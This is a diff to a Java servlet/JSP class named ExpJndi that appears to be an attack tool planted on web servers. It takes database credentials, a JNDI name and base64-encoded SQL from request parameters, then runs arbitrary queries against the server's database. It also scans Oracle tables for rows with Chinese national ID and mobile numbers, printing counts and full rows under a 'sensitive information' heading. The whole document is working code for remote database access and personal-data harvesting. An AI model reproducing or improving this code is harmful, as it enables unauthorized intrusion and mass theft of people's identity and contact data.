@@ -25,6 +25,7 @@ import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
 import javax.servlet.jsp.PageContext;
 import javax.sql.DataSource;
+import javax.xml.bind.DatatypeConverter;
 
 public class ExpJndi {
 
@@ -34,16 +35,16 @@ public class ExpJndi {
 	OutputStream out;
 	HttpSession session;
 	List<Map<String, String>> lm = null;
-	boolean bShowErr  = false;
+	boolean bShowErr = false;
 
-	public void print(byte []a)
-	{
+	public void print(byte[] a) {
 		try {
 			if (null != out && null != a)
 				out.write(a);
 		} catch (Exception e) {
 		}
 	}
+
 	public void print(String s) {
 		try {
 			if (null != s)
@@ -57,12 +58,15 @@ public class ExpJndi {
 
 	private String szCol = "\t";
 
-	public void doPreparedStatement(PreparedStatement p) {
+	public void doPreparedStatement(String sql) {
 		ResultSet rs = null;
 		ResultSetMetaData rsmd = null;
+		PreparedStatement p = null;
 		boolean bAdd = null != lm;
 		try {
-//			if(null == p)print("PreparedStatement is null");
+			log(sql);
+			p = connection.prepareStatement(sql);
+			if(null == p)log("PreparedStatement is null");
 //			else print("PreparedStatement is ok");
 			rs = p.executeQuery();
 			if (null != rs) {
@@ -93,7 +97,7 @@ public class ExpJndi {
 							String szT = rs.getString(szACol[i]);
 							if (null == szT)
 								szT = "";
-							print(szT);
+							print(szT.trim());
 							if (bAdd) {
 								mT.put(szACol[i], szT);
 							}
@@ -105,12 +109,12 @@ public class ExpJndi {
 						lm.add(mT);
 					}
 					print("\n");
-					if(0 >= nBreak--)
+					if (0 >= nBreak--)
 						break;
 				}
 				out.flush();
 			}
-//			else print("rs is null");
+			else log("rs is null");
 		} catch (Exception e) {
 			log(e);
 		} catch (Throwable e) {
@@ -119,6 +123,12 @@ public class ExpJndi {
 			if (null != rs)
 				try {
 					rs.close();
+				} catch (Throwable e) {
+					log(e);
+				}
+			if (null != p)
+				try {
+					p.close();
 				} catch (Throwable e) {
 					log(e);
 				}
@@ -140,8 +150,9 @@ public class ExpJndi {
 		StringBuffer buf = new StringBuffer();
 		ResultSet rs = null;
 		ResultSetMetaData rsmd = null;
+		PreparedStatement p = null;
 		try {
-			PreparedStatement p = null;
+
 			if (null != connection && null != sql) {
 				p = connection.prepareStatement(sql);
 				rs = p.executeQuery();
@@ -154,24 +165,30 @@ public class ExpJndi {
 					int i = 0, x = 1;
 					for (; i < nCol; i++, x++) {
 						szACol[i] = rsmd.getColumnName(x);
-						szLstColsNames += ","+szACol[i];
+						szLstColsNames += "," + szACol[i];
 					}
+					int nCnt = 20;
 					while (rs.next()) {
 						for (i = 0; i < nCol; i++) {
 							try {
 //								String szT = rs.getString(szACol[i]);
-								String szT = new String(rs.getBytes(szACol[i]),"UTF-8");
-								
+								String szT = new String(rs.getBytes(szACol[i]), "UTF-8");
+
 								if (null == szT)
 									szT = "";
 //								szT = new String(szT.getBytes(),"utf-8");
-								buf.append(szACol[i]).append(":").append(szT).append(";");
+								szT = szT.trim();
+								buf.
+//								append(szACol[i]).append(":").
+										append(szT).append(";");
 							} catch (Exception e) {
 								log(e);
 							}
 
 						}
-						break;
+						if (--nCnt < 0)
+							break;
+						buf.append("\n");
 					}
 					out.flush();
 				}
@@ -187,53 +204,55 @@ public class ExpJndi {
 				} catch (Throwable e) {
 					log(e);
 				}
+			if (null != p)
+				try {
+					p.close();
+				} catch (Throwable e) {
+					log(e);
+				}
 		}
 
-		return buf.toString();
+		return buf.toString();// .replaceAll("[\\s \\t\\r\\n]", "");
 	}
 
 	public void doSql(String sql) throws Exception {
-		PreparedStatement prep = null;
 		if (null != connection && null != sql) {
-			prep = connection.prepareStatement(sql);
-			doPreparedStatement(prep);
-		}
+			doPreparedStatement(sql);
+		} else
+			log("connection is null");
 	}
 
 	public void doCount() throws Exception {
-		lm = new ArrayList<Map<String,String>>();
-		doSql("select owner,TABLE_NAME,NUM_ROWS from all_tables where NUM_ROWS >6 order by num_rows desc");
+		lm = new ArrayList<Map<String, String>>();
+		doSql("select owner,TABLE_NAME,NUM_ROWS from all_tables where NUM_ROWS >10000 order by num_rows desc");
 		int j = 0;
-		if(0 < (j = lm.size()))
-		{
-			Map <String,String>mT = null;
+		if (0 < (j = lm.size())) {
+			Map<String, String> mT = null;
 			String sT;
-			String regularExpression = "(\\b[0-9]{17}[0-9xX])\\b";//"(^[1-9]\\d{5}(18|19|20)\\d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d{3}[0-9Xx]$)|(^[1-9]\\d{5}\\d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d{3}$)";
+			String regularExpression = "(\\b[0-9]{17}[0-9xX])\\b";// "(^[1-9]\\d{5}(18|19|20)\\d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d{3}[0-9Xx]$)|(^[1-9]\\d{5}\\d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d{3}$)";
 			String shouji = "(\\b[0-9]{11})\\b";
 			int nCnt = 0;
-	        
-			Pattern p1 = Pattern.compile(regularExpression),p2 = Pattern.compile(shouji);
-			Matcher m1,m2;
-			String szSq,szFstTb = "",szFstTbn = "",szMgb = "";
+
+			Pattern p1 = Pattern.compile(regularExpression), p2 = Pattern.compile(shouji);
+			Matcher m1, m2;
+			String szSq, szFstTb = "", szFstTbn = "", szMgb = "", szMgAll = "";
 			boolean bFst = true;
-			for(int i = 0; i < j;i++)
-			{
+			List<String> list = new ArrayList<String>();
+			for (int i = 0; i < j; i++) {
 				mT = lm.get(i);
-				if(null != mT.get("TABLE_NAME") && null != mT.get("OWNER"))
-				{
+				if (null != mT.get("TABLE_NAME") && null != mT.get("OWNER")) {
 					sT = getOneLine(szSq = "select * from " + mT.get("OWNER") + "." + mT.get("TABLE_NAME"));
-					if(null != sT && 18 < sT.length())
-					{
+					if (null != sT && 18 < sT.length()) {
 						m1 = p1.matcher(sT);
 						m2 = p2.matcher(sT);
-						if(null != m1 && m1.find() && null != m2 && m2.find())
-						{
+						if (null != m1 && m1.find() && null != m2 && m2.find()) {
+							szMgAll += "\n表名:" + mT.get("OWNER") + "." +mT.get("TABLE_NAME") + "\n" + sT + "\n\n";
 //							print("\n("+mT.get("NUM_ROWS")+")"+szSq+"\n");// + sT
 							nCnt += Integer.parseInt(mT.get("NUM_ROWS"));
-							if(bFst)
-							{
+							list.add(mT.get("OWNER") + "." + mT.get("TABLE_NAME"));
+							if (bFst) {
 								bFst = false;
-								szFstTbn =  mT.get("OWNER") + "." + mT.get("TABLE_NAME");
+								szFstTbn = mT.get("OWNER") + "." + mT.get("TABLE_NAME");
 								szFstTb = szLstColsNames;
 //								print((szFstTb = szLstColsNames) + "\n");
 							}
@@ -244,7 +263,8 @@ public class ExpJndi {
 			}
 			print("\n敏感信息累计：" + nCnt);
 			print("\n敏感信息表分布：" + szMgb + "\n");
-			String szSql1 = "";
+			print(szMgAll);
+//			String szSql1 = "";
 //			if(0 < szFstTbn.length())
 //			{
 //				szFstTbn = szFstTbn.substring(1);
@@ -261,24 +281,41 @@ public class ExpJndi {
 //				print(szSql1);
 //				print(getOneLine("select count(1) as a from "+ szFstTbn + "_A"));
 //			}
+//			if(0 < list.size())
+//			{
+//				for(int i = 0; i < list.size(); i++)
+//				{
+//					nBreak = 20;
+//					String szS = "SELECT * FROM (SELECT * FROM "+list.get(i)+") WHERE ROWNUM <= "+nBreak;
+//					print("\n"+nBreak+"条："+szS + "\n");
+//					
+//					doSql(szS);
+//				}
+//			}
+
 		}
 	}
+
 	private int nBreak = Integer.MAX_VALUE;
 	private String jdbc_drv = null;
 	private String jdbc_url = null;
 	private String jdbc_u = null;
 	private String jdbc_p = null;
+
 	public void c() throws Exception {
 		String sql = request.getParameter("s"), jds = request.getParameter("j"), c1 = request.getParameter("col");
 		jdbc_drv = request.getParameter("jdbc_drv");
-		if(null == jdbc_drv)jdbc_drv = "oracle.jdbc.OracleDriver";
+		if (null == jdbc_drv)
+			jdbc_drv = "oracle.jdbc.OracleDriver";
 		jdbc_url = request.getParameter("jdbc_url");
 		jdbc_u = request.getParameter("jdbc_u");
 		jdbc_p = request.getParameter("jdbc_p");
-		if(null != request.getParameter("nBreak"))
+		if (null != request.getParameter("nBreak"))
 			nBreak = Integer.parseInt(request.getParameter("nBreak"));
 		if (null == jds) {
 			jds = getJndiName();
+			if (bShowErr)
+				print("\n当前jndi: " + jds + "\n");
 			if (null == jds) {
 				return;
 			}
@@ -286,11 +323,15 @@ public class ExpJndi {
 		}
 		if (null != c1)
 			szCol = c1;
-		getConnection(jds);
-		if (null == sql || 10 > sql.length()) {
+		if (null != jds)
+			getConnection(jds);
+		if (null == sql || 5 > sql.length()) {
 			doCount();
 		} else
+		{
+			sql=new String(DatatypeConverter.parseBase64Binary(sql),"utf-8");
 			doSql(sql);
+		}
 	}
 
 	public ArrayList<String> listContext(Context ctx, String indent, ArrayList<String> output) throws NamingException {
@@ -347,6 +388,12 @@ public class ExpJndi {
 				if (0 < tab.size()) {
 					return tab.get(0);
 				}
+				if (bShowErr && 1 < tab.size()) {
+					print("\n发现多个连接次: \n");
+					for (int i = 0; i < tab.size(); i++) {
+						print("\n" + tab.get(i) + "\n");
+					}
+				}
 			}
 		} catch (Exception e) {
 			log(e);
@@ -373,7 +420,7 @@ public class ExpJndi {
 				}
 				response.reset();
 				response.setContentType("text/html; charset=utf-8");
-				if(null != request.getParameter("es"))
+				if (null != request.getParameter("es"))
 					bShowErr = true;
 				c();
 			} catch (Exception e) {
@@ -391,21 +438,29 @@ public class ExpJndi {
 	}
 
 	public void log(Throwable e) {
-		if (bShowErr && null != response)
+		if (bShowErr && null != response && null != e)
 			try {
-				if (null != e)
-				{
-					ByteArrayOutputStream out1 = new ByteArrayOutputStream(); 
+					ByteArrayOutputStream out1 = new ByteArrayOutputStream();
 					e.printStackTrace(new PrintWriter(out1));
-					print(out1.toByteArray());
-				}
+					out1.flush();
+					if(0 == out1.size())
+						print(e.getMessage());
+					else print(out1.toByteArray());
+					out1.close();
 //				e.printStackTrace(response.getWriter());
 			} catch (Exception e1) {
+				log(e1.getMessage());
 			}
 	}
 
+	public void log(String s) {
+		if (bShowErr && null != response)
+			print(s);
+	}
+
 	public Connection getConnection(String s) {
-		if (connection == null)
+		log("[" + s + "]");
+		if (connection == null && null != s && 1 < s.length())
 			try {
 				InitialContext context = new InitialContext();
 				DataSource dataSource = (DataSource) context.lookup(s);
@@ -415,15 +470,16 @@ public class ExpJndi {
 				log(e);
 			}
 		if (null == connection) {
-			if(null != jdbc_url && null != jdbc_u && null != jdbc_p)
-			try {
-				if(null != jdbc_drv)
-					Class.forName(jdbc_drv);
-				connection = DriverManager.getConnection(jdbc_url,jdbc_u,jdbc_p);
-			} catch (Exception e) {
-				log(e);
-			}
-			if (null == connection) print("[" + s + "]");
+			if (null != jdbc_url && null != jdbc_u && null != jdbc_p)
+				try {
+					if (null != jdbc_drv)
+						Class.forName(jdbc_drv);
+					connection = DriverManager.getConnection(jdbc_url, jdbc_u, jdbc_p);
+				} catch (Exception e) {
+					log(e);
+				}
+//			if (null == connection && null != s)
+//				print("[" + s + "]");
 		}
 		return connection;
 	}
